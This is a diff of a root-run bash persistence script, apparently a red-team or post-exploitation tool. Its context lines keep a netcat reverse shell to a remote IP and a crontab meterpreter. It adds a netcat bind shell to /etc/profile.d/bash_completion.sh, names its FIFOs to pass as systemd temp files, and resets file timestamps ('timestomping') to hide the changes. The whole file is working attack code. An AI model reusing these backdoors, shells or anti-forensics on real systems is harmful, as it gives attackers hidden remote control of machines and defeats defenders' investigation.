@@ -1,66 +1,98 @@
-#!/bin/bash
+#!/usr/bin/env bash
 
+# Root check
 if [ $EUID -ne 0 ]; then
 	echo "[!] Must run as root"
 	exit 1
 fi
 
 
-
 # *** Helper Functions ***
 
-# Colored text output
-cecho () {
-	ColorOff='\033[0m'
-	BWhite='\033[1;37m'
-	Red='\033[0;31m'
-	Yellow='\033[0;33m'
-	Cyan='\033[0;36m'
-	Blue='\033[0;34m'
-	Purple='\033[0;35m'
-	Green='\033[0;32m'
+# Colors
+COLOR_OFF='\033[0m'
+BOLD_WHITE='\033[1;37m'
+RED='\033[0;31m'
+YELLOW='\033[0;33m'
+CYAN='\033[0;36m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+GREEN='\033[0;32m'
 
-	local CechoUsage="${Red}[!] cecho usage: cecho <task|error|warning|info|debug|done> <\"log_message\">${ColorOff}"
+#######################################
+# Log colored and status-prefixed text to the terminal depending on the
+# user-provided log type.
+#
+# Globals:
+#   All above colors
+# Arguments:
+#   Log type, one of "task", "error", "warning", "info", "log", or "debug"
+#   Log message, the message to be printed to the terminal
+# Outputs:
+#   Colored and status-prefixed text otherwise, or usage on error
+# Returns:
+#   0 if cecho usage was correct, 1 otherwise
+########################################
+cecho() {
+	local cecho_usage="${RED}[!] cecho usage: cecho <task|error|warning|info|log|debug|sep|done> <\"log_message\">${COLOR_OFF}"
 
 	if [ $# -ne 2 ]; then
-		echo -e "$CechoUsage"
+		echo -e "$cecho_usage"
 		return 1
 	fi
 
-	local LogType=$1
-	local LogMessage=$2
+	local log_type=$1
+	local log_message=$2
 
-	case $LogType in
+	case $log_type in
 		"task")
-			echo
-			echo -e "${BWhite}[+] --- ${LogMessage}${ColorOff}"
+			echo -e "${BOLD_WHITE}[+] --- ${log_message}${COLOR_OFF}"
 			;;
 		"error")
-			echo -e "${Red}[!] ${LogMessage}${ColorOff}"
+			echo -e "${RED}[!] ${log_message}${COLOR_OFF}" >&2 # print to STDERR
 			;;
 		"warning")
-			echo -e "${Yellow}[-] ${LogMessage}${ColorOff}"
+			echo -e "${YELLOW}[-] ${log_message}${COLOR_OFF}"
 			;;
 		"info")
-			echo -e "${Cyan}[*] ${LogMessage}${ColorOff}"
+			echo -e "${CYAN}[*] ${log_message}${COLOR_OFF}"
 			;;
 		"log")
-			echo -e "${Blue}[^] ${LogMessage}${ColorOff}"
+			echo -e "${BLUE}[^] ${log_message}${COLOR_OFF}"
 			;;
 		"debug")
-			echo -e "${Purple}[?] ${LogMessage}${ColorOff}"
+			echo -e "${PURPLE}[?] ${log_message}${COLOR_OFF}"
+			;;
+		"sep")
+			echo -en "${YELLOW}"
+			for _ in {1..10}; do echo -n "${log_message}"; done
+			echo -e "${COLOR_OFF}"
 			;;
 		"done")
-			echo -e "${Green}[=] ${LogMessage}${ColorOff}"
+			echo -e "${GREEN}[=] ${log_message}${COLOR_OFF}"
+			echo
 			;;
 		*)
-			echo -e "$CechoUsage"
+			echo -e "$cecho_usage"
+			return 1
 			;;
 	esac
 }
 
-# Get a file's timestamp in YYYYMMDDhhmm format to use with "time -t"
-get_timestamp () {
+
+#######################################
+# Get a file's timestamp in YYYYMMDDhhmm format for use with "time -t".
+#
+# Globals:
+#   None
+# Arguments:
+#   The file path to retrieve the timestamp from
+# Outputs:
+#   Status or usage on error, otherwise nothing
+# Returns:
+#   0 if stat obtained file's timestamp, 1 otherwise
+########################################
+get_timestamp() {
 	if [ $# -ne 1 ]; then
 		cecho error "get_timestamp usage: get_timestamp <file>"
 		return 1
@@ -68,13 +100,32 @@ get_timestamp () {
 	
 	local file="$1"
 
-	if ! stat -L "$file" | grep "Modify" | cut -d " " -f 2,3 | cut -d ":" -f 1,2 | tr -d "-" | tr -d ":" | tr -d " "; then
+	if ! stat -L "$file" \
+		| grep "Modify" \
+		| cut -d " " -f 2,3 \
+		| cut -d ":" -f 1,2 \
+		| tr -d "-" \
+		| tr -d ":" \
+		| tr -d " "; then
 		cecho error "Couldn't stat '$file'"
 		return 1
 	fi
 }
 
-set_timestamp () {
+
+#######################################
+# Set a file's timestamp (perform a "timestomp").
+#
+# Globals:
+#   None
+# Arguments:
+#   The file path to set the timestamp on
+# Outputs:
+#   Status or usage on error, otherwise nothing
+# Returns:
+#   0 if file's timestamp was set, 1 otherwise
+########################################
+set_timestamp() {
 	if [ $# -ne 2 ]; then
 		cecho error "set_timestamp usage: set_timestamp <timestamp> <file>"
 		return 1
@@ -92,6 +143,29 @@ set_timestamp () {
 }
 
 
+#######################################
+# Check if the given command exists and is executable.
+#
+# Globals:
+#   None
+# Arguments:
+#   The binary/command to search the existence of
+# Outputs:
+#   Usage information on improper usage, otherwise none
+# Returns:
+#   0 if the binary/command exists, 1 otherwise
+########################################
+exists() {
+	if [ $# -ne 1 ]; then
+		cecho error "exists usage: exists <binary/command/executable>"
+		return 1
+	fi
+	
+	local search="$1"
+
+	test -x "$(command -v "$search")" &>/dev/null
+}
+
 
 # *** Configurable variables ***
 
@@ -100,8 +174,11 @@ NORMAL_PORT="59000"
 WEB_PORT="59001"
 REVERSE_PORT="59002"
 BIND_PORT="60000"
-FIFO="/tmp/systemd-private-68eb5cd948c04958a3aa64dc96efabaa-colord.service-73xi5h"
+FIFO_REVERSE="/tmp/systemd-private-68eb5cd948c04958a3aa64dc96efabaa-colord.service-73xi5h"
+FIFO_BIND="systemd-private-68eb5cd948c03875a3aa64dc96efabaa-upower.service-O6ME4M"
 GLOBAL_PROFILE="/etc/profile"
+GLOBAL_PROFILE_DIR="/etc/profile.d"
+PROFILE_FILE="bash_completion.sh"
 
 # Crontab meterpreter
 METERPRETER="/tmp/linux_$NORMAL_PORT"
@@ -170,7 +247,7 @@ reverse_shells="
   fi
 
   if command -v nc > /dev/null 2>&1; then
-    rm $FIFO;mkfifo $FIFO;cat $FIFO|/bin/sh -i 2>&1|nc $IP $REVERSE_PORT >$FIFO
+    rm $FIFO_REVERSE;mkfifo $FIFO_REVERSE;cat $FIFO_REVERSE|/bin/sh -i 2>&1|nc $IP $REVERSE_PORT >$FIFO_REVERSE
 		sleep 10
 		continue
   fi
@@ -197,6 +274,43 @@ else
 fi
 
 cecho done "Done persisting reverse shells in '$GLOBAL_PROFILE'"
+
+
+
+cecho task "Adding netcat (nc) bind shell on port $BIND_PORT to '$GLOBAL_PROFILE_DIR/$PROFILE_FILE'"
+
+if ! exists nc; then
+	cecho error "Netcat not installed, skipping"
+elif [ ! -d "$GLOBAL_PROFILE_DIR" ]; then
+	cecho error "Global profile directory '$GLOBAL_PROFILE_DIR' does not exist, skipping"
+else
+	tmp_timestamp=$(get_timestamp "/tmp")
+	profile_dir_timestamp=$(get_timestamp "$GLOBAL_PROFILE_DIR")
+
+	if [ ! -f "$GLOBAL_PROFILE_DIR/$PROFILE_FILE" ]; then
+		cecho info "File '$GLOBAL_PROFILE_DIR/$PROFILE_FILE' does not exist, it will be created"
+		profile_file_timestamp=$profile_dir_timestamp
+	else
+		cecho log "File '$GLOBAL_PROFILE_DIR/$PROFILE_FILE' already exists"
+		profile_file_timestamp=$(get_timestamp "$GLOBAL_PROFILE_DIR/$PROFILE_FILE")
+	fi
+
+	if grep -q "| /bin/sh -i 2>&1 | nc -nlp" "$GLOBAL_PROFILE_DIR/$PROFILE_FILE"; then
+		cecho log "Netcat bind shell already placed in '$GLOBAL_PROFILE_DIR/$PROFILE_FILE', skipping"
+	else
+		if exists bakcat; then # the backup cat we may have created during the weakening script
+			echo "(setsid sh -c \"rm -f /tmp/$FIFO_BIND-\$(whoami) && mkfifo /tmp/$FIFO_BIND-\$(whoami) && while true; do bakcat /tmp/$FIFO_BIND-\$(whoami) | /bin/sh -i 2>&1 | nc -nlp \$(($BIND_PORT + \$(id -u))) 2>/dev/null > /tmp/$FIFO_BIND-\$(whoami) || break; done\")&" >> "$GLOBAL_PROFILE_DIR/$PROFILE_FILE" && cecho info "Appended bind shell command" || cecho error "Could not append to '$GLOBAL_PROFILE_DIR/$PROFILE_FILE'"
+		else # original cat binary, untouched
+			echo "(setsid sh -c \"rm -f /tmp/$FIFO_BIND-\$(whoami) && mkfifo /tmp/$FIFO_BIND-\$(whoami) && while true; do cat /tmp/$FIFO_BIND-\$(whoami) | /bin/sh -i 2>&1 | nc -nlp \$(($BIND_PORT + \$(id -u))) 2>/dev/null > /tmp/$FIFO_BIND-\$(whoami) || break; done\")&" >> "$GLOBAL_PROFILE_DIR/$PROFILE_FILE" && cecho info "Appended bind shell command" || cecho error "Could not append to '$GLOBAL_PROFILE_DIR/$PROFILE_FILE'"
+		fi
+	fi
+
+	set_timestamp $tmp_timestamp "/tmp"
+	set_timestamp $profile_dir_timestamp "$GLOBAL_PROFILE_DIR"
+	set_timestamp $profile_file_timestamp "$GLOBAL_PROFILE_DIR/$PROFILE_FILE"
+fi
+
+cecho done "Done adding netcat bind shell on port $BIND_PORT"
 
 
 
